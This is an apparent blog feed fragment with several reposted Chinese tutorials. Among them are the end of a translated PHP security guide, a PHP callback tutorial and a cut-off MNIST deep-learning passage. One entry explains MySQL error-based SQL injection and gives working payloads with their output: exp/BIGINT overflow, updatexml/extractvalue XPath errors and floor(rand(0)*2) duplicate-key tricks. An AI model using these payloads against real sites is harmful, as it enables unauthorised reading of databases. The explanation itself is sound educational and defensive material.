href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fsektioneins%2Fsuhosin" target="_blank" rel="noopener">Suhosin</a>的精神继承者，似乎在很大程度上会被放弃）</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fphpdelusions.net%2F" target="_blank" rel="noopener">PHP Delusions</a>：一个致力于更好地使用 PHP 的网站。大部分的口吻是非常有见地的，作者对技术的准确性和清晰度的奉献使得值得一读，特别是对于那些不太喜欢 PDO 功能的人来说。</li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fhaveibeenpwned.com%2F" target="_blank" rel="noopener">Have I Been Pwned?</a>：帮助用户发现他们的数据是否属于过时数据泄露。</li></ul><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>原文地址：<a href="https://link.juejin.im/?target=https%3A%2F%2Fparagonie.com%2Fblog%2F2017%2F12%2F2018-guide-building-secure-php-software" target="_blank" rel="noopener">The 2018 Guide to Building Secure PHP Software - P.I.E. Staff</a></p><p>最早是在Laravel China社区里帖子 - <a href="https://link.juejin.im/?target=https%3A%2F%2Flaravel-china.org%2Ftopics%2F7080%2Fthe-2018-guide-to-building-secure-php-software" target="_blank" rel="noopener">The 2018 Guide to Building Secure PHP Software</a>看到，一位同学只发了原链接，由于是全英，文章也比较长，就没有深读，但可以知道这是一篇很好的文章，值得学习，这几天花了时间翻译了全文。</p><p>为避免歧义，部分专业名词和语句保留了原文。翻译过程借助了 Google 和 Google 翻译，本人英文和相关专业水平有限，如有错误感谢指出修正。</p><blockquote><p>翻译版权所有: 癞蛤蟆想吃炖大鹅</p><p> 版权声明：自由转载-非商用-非衍生-保持署名（<a href="https://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh" target="_blank" rel="noopener">创意共享3.0许可证</a>）</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;The 2018 Guide to Building Secure PHP Software！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;2018 年将至，一般程序员（特别是 Web 开发程序员）应当抛弃过去开发PHP程序的很多不好的习惯和观念了。虽然部分人不以为意，但是这确实是事实。&lt;/p&gt;
&lt;p&gt;这个指南应该以重点部分作为 &lt;a href=&quot;https://link.juejin.im/?target=http%3A%2F%2Fwww.phptherightway.com%2F&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;PHP: The Right Way&lt;/a&gt; 安全章节的补充，而不是以一般的 PHP 编程话题。&lt;/p&gt;
&lt;h2 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h2&gt;&lt;h2 id=&quot;PHP-版本&quot;&gt;&lt;a href=&quot;#PHP-版本&quot; class=&quot;headerlink&quot; title=&quot;PHP 版本&quot;&gt;&lt;/a&gt;PHP 版本&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;请在 2018 年使用 PHP 7.2, 并且计划 2019 年初切换到 PHP 7.3。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;PHP 7.2 已于 2017 年 11 月 30 日发布。&lt;/p&gt;
&lt;p&gt;写这篇文章的时候，只有 7.1 和 7.2 版本还在被 PHP 官方积极维护，而 5.6 和 7.0 只在大概1年内提供安全补丁更新。&lt;/p&gt;
&lt;p&gt;对于其他官方不维护的 PHP 版本，虽然某些操作系统会提供长期支持和维护，但这其实通常是有害的。尤其是他们提供安全支持补丁却没有版本号，这使得很难解释系统的安全性（仅仅知道 PHP 版本）。&lt;/p&gt;
&lt;p&gt;因此，无论其他供应商提出了什么承诺，如果可以，你就应该在任何时候都坚决地使用&lt;a href=&quot;https://link.juejin.im/?target=http%3A%2F%2Fphp.net%2Fsupported-versions.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;官方提供支持的 PHP 版本&lt;/a&gt;。这样，尽管最终是一个短暂的安全版本，但一个不断致力于升级的版本，总会让你收获一些意外的惊喜。&lt;/p&gt;
    
    </summary>
    
    
      <category term="php" scheme="http://www.twosee.cn/tags/php/"/>
    
      <category term="security" scheme="http://www.twosee.cn/tags/security/"/>
    
      <category term="hack" scheme="http://www.twosee.cn/tags/hack/"/>
    
  </entry>
  
  <entry>
    <title>[转] Mysql注入后利用</title>
    <link href="http://www.twosee.cn/2018/01/06/mysql-injection/"/>
    <id>http://www.twosee.cn/2018/01/06/mysql-injection/</id>
    <published>2018-01-05T17:33:18.000Z</published>
    <updated>2018-05-12T03:19:40.130Z</updated>
    
    <content type="html"><![CDATA[<p>SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟用盲注的话既耗时又容易被封。</p><p>MYSQL报错注入个人认为大体可以分为以下几类：</p><ol><li>BIGINT等数据类型溢出</li><li>xpath语法错误</li><li>concat+rand()+group_by()导致主键重复</li><li>一些特性</li></ol><p>下面就针对这几种错误类型看看背后的原理是怎样的。</p><a id="more"></a><h2 id="0x01-数据溢出"><a href="#0x01-数据溢出" class="headerlink" title="0x01 数据溢出"></a>0x01 数据溢出</h2><p>这里可以看到mysql是怎么处理整形的：<a href="https://dev.mysql.com/doc/refman/5.5/en/integer-types.html" target="_blank" rel="noopener">Integer Types (Exact Value)</a>，如下表：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://edu.aqniu.com/files/default/2017/03-08/142134e6bab6545212.jpg" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>在mysql5.5之前，整形溢出是不会报错的，根据官方文档说明<a href="https://dev.mysql.com/doc/refman/5.5/en/out-of-range-and-overflow.html" target="_blank" rel="noopener">out-of-range-and-overflow</a>，只有版本号大于5.5.5时，才会报错。试着对最大数做加法运算，可以看到报错的具体情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 18446744073709551615+1;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range <span class="keyword">in</span> <span class="string">'(18446744073709551615 + 1)'</span></span><br></pre></td></tr></table></figure><p>在mysql中，要使用这么大的数，并不需要输入这么长的数字进去，使用按位取反运算运算即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0;</span><br><span class="line">+----------------------+</span><br><span class="line">| ~0                   |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551615 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select ~0+1;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &apos;(~(0) + 1)&apos;</span><br></pre></td></tr></table></figure><p>我们知道，如果一个查询成功返回，则其返回值为0，进行逻辑非运算后可得1，这个值是可以进行数学运算的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select * from (select user())x);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| (select * from (select user())x) |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| root@localhost                   |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select !(select * from (select user())x);</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| !(select * from (select user())x) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 1 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select !(select * from (select user())x)+1;</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| !(select * from (select user())x)+1 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">|                                   2 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>同理，利用exp函数也会产生类似的溢出错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exp(709);</span><br><span class="line">+-----------------------+</span><br><span class="line">| exp(709)              |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 8.218407461554972e307 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select exp(710);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(710)&apos;</span><br></pre></td></tr></table></figure><p>注入姿势：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exp(~(select*from(select user())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(~((select &apos;root@localhost&apos; from dual)))&apos;</span><br></pre></td></tr></table></figure><p>利用这一特性，再结合之前说的溢出报错，就可以进行注入了。这里需要说一下，经笔者测试，发现在mysql5.5.47可以在报错中返回查询结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &apos;((not(&apos;root@localhost&apos;)) - ~(0))&apos;</span><br></pre></td></tr></table></figure><p>而在mysql&gt;5.5.53时，则不能返回查询结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &apos;((not(`a`.`x`)) - ~(0))&apos;</span><br></pre></td></tr></table></figure><p>此外，报错信息是有长度限制的，在mysql/my_error.c中可以看到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/* Max length of a error message. Should be</span><br><span class="line">kept in sync with MYSQL_ERRMSG_SIZE. */</span><br><span class="line"></span><br><span class="line">#define ERRMSGSIZE (512)</span><br></pre></td></tr></table></figure><h2 id="0x02-xpath语法错误"><a href="#0x02-xpath语法错误" class="headerlink" title="0x02 xpath语法错误"></a>0x02 xpath语法错误</h2><p>从mysql5.1.5开始提供两个<a href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html" target="_blank" rel="noopener">XML查询和修改的函数</a>，extractvalue和updatexml。extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select extractvalue(1,&apos;/a/b&apos;);</span><br><span class="line">+------------------------+</span><br><span class="line">| extractvalue(1,&apos;/a/b&apos;) |</span><br><span class="line">+------------------------+</span><br><span class="line">|                        |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(1,concat(0x7e,(select @@version),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~5.7.17~&apos;</span><br><span class="line">mysql&gt; select extractvalue(1,concat(0x7e,(select @@version),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~5.7.17~&apos;</span><br></pre></td></tr></table></figure><h2 id="0x03-主键重复"><a href="#0x03-主键重复" class="headerlink" title="0x03 主键重复"></a>0x03 主键重复</h2><p>这里利用到了count()和group by在遇到rand()产生的重复值时报错的思路。网上比较常见的payload是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*) from test group by concat(version(),floor(rand(0)*2));</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &apos;5.7.171&apos; for key &apos;&lt;group_key&gt;&apos;</span><br></pre></td></tr></table></figure><p>可以看到错误类型是duplicate entry，即主键重复。实际上只要是count，rand()，group by三个连用就会造成这种报错，与位置无关：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &apos;5.7.171&apos; for key &apos;&lt;group_key&gt;&apos;</span><br></pre></td></tr></table></figure><p>这种报错方法的本质是因为<code>floor(rand(0)*2)</code>的重复性，导致group by语句出错。<code>group by key</code>的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据。举个例子，表中数据如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from test;</span><br><span class="line">+------+-------+</span><br><span class="line">| id   | name  |</span><br><span class="line">+------+-------+</span><br><span class="line">| 0    | jack  |</span><br><span class="line">| 1    | jack  |</span><br><span class="line">| 2    | tom   |</span><br><span class="line">| 3    | candy |</span><br><span class="line">| 4    | tommy |</span><br><span class="line">| 5    | jerry |</span><br><span class="line">+------+-------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>我们以<code>select count(*) from test group by name</code>语句说明大致过程如下：</p><ul><li>先是建立虚拟表，其中key为主键，不可重复：</li></ul><table><thead><tr><th>key</th><th>count(*)</th></tr></thead><tbody><tr><td></td></tr></tbody></table><ul><li>开始查询数据，去数据库数据，然后查看虚拟表是否存在，不存在则插入新记录，存在则count(*)字段直接加1：</li></ul><table><thead><tr><th>key</th><th>count(*)</th></tr></thead><tbody><tr><td>jack</td><td>1</td></tr></tbody></table><table><thead><tr><th>key</th><th>count(*)</th></tr></thead><tbody><tr><td>jack</td><td>1+1</td></tr></tbody></table><table><thead><tr><th>key</th><th>count(*)</th></tr></thead><tbody><tr><td>jack</td><td>1+1</td></tr><tr><td>tom</td><td>1</td></tr></tbody></table><table><thead><tr><th>key</th><th>count(*)</th></tr></thead><tbody><tr><td>jack</td><td>1+1</td></tr><tr><td>tom</td><td>1</td></tr><tr><td>candy</td><td>1</td></tr></tbody></table><p>当这个操作遇到rand(0)*2时，就会发生错误，其原因在于rand(0)是个稳定的序列，我们计算两次rand(0)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rand(0) from test;</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">|   0.620881741513388 |</span><br><span class="line">|  0.6387474552157777 |</span><br><span class="line">| 0.33109208227236947 |</span><br><span class="line">|  0.7392180764481594 |</span><br><span class="line">|  0.7028141661573334 |</span><br><span class="line">+---------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select rand(0) from test;</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">|   0.620881741513388 |</span><br><span class="line">|  0.6387474552157777 |</span><br><span class="line">| 0.33109208227236947 |</span><br><span class="line">|  0.7392180764481594 |</span><br><span class="line">|  0.7028141661573334 |</span><br><span class="line">+---------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>同理，floor(rand(0)*2)则会固定得到011011…的序列(这个很重要)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select floor(rand(0)*2) from test;</span><br><span class="line">+------------------+</span><br><span class="line">| floor(rand(0)*2) |</span><br><span class="line">+-----------</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟用盲注的话既耗时又容易被封。&lt;/p&gt;
&lt;p&gt;MYSQL报错注入个人认为大体可以分为以下几类：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;BIGINT等数据类型溢出&lt;/li&gt;
&lt;li&gt;xpath语法错误&lt;/li&gt;
&lt;li&gt;concat+rand()+group_by()导致主键重复&lt;/li&gt;
&lt;li&gt;一些特性&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;下面就针对这几种错误类型看看背后的原理是怎样的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="mysql" scheme="http://www.twosee.cn/tags/mysql/"/>
    
      <category term="sql" scheme="http://www.twosee.cn/tags/sql/"/>
    
      <category term="injection" scheme="http://www.twosee.cn/tags/injection/"/>
    
  </entry>
  
  <entry>
    <title>[转] 4种PHP回调函数</title>
    <link href="http://www.twosee.cn/2018/01/04/PHP-callback/"/>
    <id>http://www.twosee.cn/2018/01/04/PHP-callback/</id>
    <published>2018-01-03T21:47:33.000Z</published>
    <updated>2018-05-12T03:19:48.734Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>以Swoole服务事件回调为例</p></blockquote><h2 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$server-&gt;on(<span class="string">'Request'</span>, <span class="function"><span class="keyword">function</span> <span class="params">($req, $resp)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello world"</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="类静态方法"><a href="#类静态方法" class="headerlink" title="类静态方法"></a>类静态方法</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">($req, $resp)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"hello world"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$server-&gt;on(<span class="string">'Request'</span>, <span class="string">'A::Test'</span>);</span><br><span class="line">$server-&gt;on(<span class="string">'Request'</span>, <span class="keyword">array</span>(<span class="string">'A'</span>, <span class="string">'Test'</span>));</span><br></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_onRequest</span><span class="params">($req, $resp)</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello world"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$server-&gt;on(<span class="string">'Request'</span>, <span class="string">'my_onRequest'</span>);</span><br></pre></td></tr></table></figure><h2 id="对象方法"><a href="#对象方法" class="headerlink" title="对象方法"></a>对象方法</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">($req, $resp)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"hello world"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$object = <span class="keyword">new</span> A();</span><br><span class="line">$server-&gt;on(<span class="string">'Request'</span>, <span class="keyword">array</span>($object, <span class="string">'test'</span>));</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;以Swoole服务事件回调为例&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;匿名函数&quot;&gt;&lt;a href=&quot;#匿名函数&quot; class=&quot;headerlink&quot; title=&quot;匿名函数&quot;&gt;&lt;/a&gt;匿名函数&lt;/h2&gt;&lt;figure class=&quot;
      
    
    </summary>
    
    
      <category term="php" scheme="http://www.twosee.cn/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>[转] 人人都可以做深度学习应用 加强篇</title>
    <link href="http://www.twosee.cn/2018/01/04/AI-everyone-plus/"/>
    <id>http://www.twosee.cn/2018/01/04/AI-everyone-plus/</id>
    <published>2018-01-03T21:40:56.000Z</published>
    <updated>2018-05-12T03:18:57.903Z</updated>
    
    <content type="html"><![CDATA[<h2 id="经典入门demo：识别手写数字（MNIST）"><a href="#经典入门demo：识别手写数字（MNIST）" class="headerlink" title="经典入门demo：识别手写数字（MNIST）"></a>经典入门demo：识别手写数字（MNIST）</h2><p>常规的编程入门有“Hello world”程序，而深度学习的入门程序则是MNIST，一个识别28×28像素的图片中的手写数字的程序。</p><p>备注：<a href="http://yann.lecun.com/exdb/mnist/" target="_blank" rel="noopener">MNIST 的数据和官网</a></p><p>深度学习的内容，其背后会涉及比较多的数学原理，作为一个初学者，受限于我个人的数学和技术水平，也许并不足以准确讲述相关的数学原理，因此，本文会更多的关注“应用层面”，不对背后的数学原理进行展开，感谢谅解。</p><a id="more"></a><h3 id="1-加载数据"><a href="#1-加载数据" class="headerlink" title="1. 加载数据"></a>1. 加载数据</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835237768_1640_1487835232627.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>程序执行的第一步当然是加载数据，根据我们之前获得的数据集主要包括两部分：60000的训练数据集（mnist.train）和10000的测试数据集（mnist.test）。里面每一行，是一个28×28=784的数组，数组的本质就是将28×28像素的图片，转化成对应的像素点阵。</p><p>例如手写字1的图片转换出来的对应矩阵表示如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835254243_8947_1487835249287.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>之前我们经常听说，图片方面的深度学习需要大量的计算能力，甚至需要采用昂贵、专业的GPU（Nvidia的GPU），从上述转化的案例我们就已经可以获得一些答案了。一张784像素的图片，对学习模型来说，就有784个特征，而我们实际的相片和图片动辄几十万、百万级别，则对应的基础特征数也是这个数量级，基于这样数量级的数组进行大规模运算，没有强大的计算能力支持，确实寸步难行。当然，这个入门的MNIST的demo还是可以比较快速的跑完。</p><p>Demo中的关键代码（读取并且加载数据到数组对象中，方便后面使用）：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835274838_4756_1487835269849.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><h3 id="2-构建模型"><a href="#2-构建模型" class="headerlink" title="2. 构建模型"></a>2. 构建模型</h3><p>MNIST的每一张图片都表示一个数字，从0到9。而模型最终期望获得的是：给定一张图片，获得代表每个数字的概率。比如说，模型可能推测一张数字9的图片代表数字9的概率是80%但是判断它是8的概率是5%（因为8和9都有上半部分的小圆），然后给予它代表其他数字的概率更小的值。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835288965_8390_1487835283908.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>MNIST的入门例子，采用的是softmax回归(softmax regression)，softmax模型可以用来给不同的对象分配概率。<br>为了得到一张给定图片属于某个特定数字类的证据（evidence），我们对图片的784个特征（点阵里的各个像素值）进行加权求和。如果某个特征（像素值）具有很强的证据说明这张图片不属于该类，那么相应的权重值为负数，相反如果某个特征（像素值）拥有有利的证据支持这张图片属于这个类，那么权重值是正数。类似前面提到的房价估算例子，对每一个像素点作出了一个权重分配。</p><p>假设我们获得一张图片，需要计算它是8的概率，转化成数学公式则如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835305590_4981_1487835300408.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>公式中的i代表需要预测的数字（8），代表预测数字为8的情况下，784个特征的不同权重值，代表8的偏置量（bias），X则是该图片784个特征的值。通过上述计算，我们则可以获得证明该图片是8的证据（evidence）的总和，softmax函数可以把这些证据转换成概率 y。（softmax的数学原理，辛苦各位查询相关资料哈）</p><p>将前面的过程概括成一张图（来自官方）则如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835319864_5485_1487835315023.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>不同的特征x和对应不同数字的权重进行相乘和求和，则获得在各个数字的分布概率，取概率最大的值，则认为是我们的图片预测结果。</p><p>将上述过程写成一个等式，则如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835336660_2173_1487835331741.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>该等式在矩阵乘法里可以非常简单地表示，则等价为：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835350149_4207_1487835345272.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>不展开里面的具体数值，则可以简化为：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835363125_5606_1487835358008.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>如果我们对线性代数中矩阵相关内容有适当学习，其实，就会明白矩阵表达在一些问题上，更易于理解。如果对矩阵内容不太记得了，也没有关系，后面我会附加上线性代数的视频。</p><p>虽然前面讲述了这么多，其实关键代码就四行：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://blog-10039692.file.myqcloud.com/1487835377739_8249_1487835372756.png" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>上述代码都是类似变量占位符，先设置好模型计算方式，在真实训练流程中，需要批量读取源数据，不断给它们填充数据，模型计算才会真实跑起来。tf.zeros则表示，先给它们统一赋值为0占位。X数据是从数据文件中读取的，而w、b是在训练过程中不断变化和更新的，y则是基于前面的数据进行计算得到。</p><h3 id="3-损失函数和优化设置"><a href="#3-损失函数和优化设置" class="headerlink" title="3. 损失函数和优化设置"></a>3. 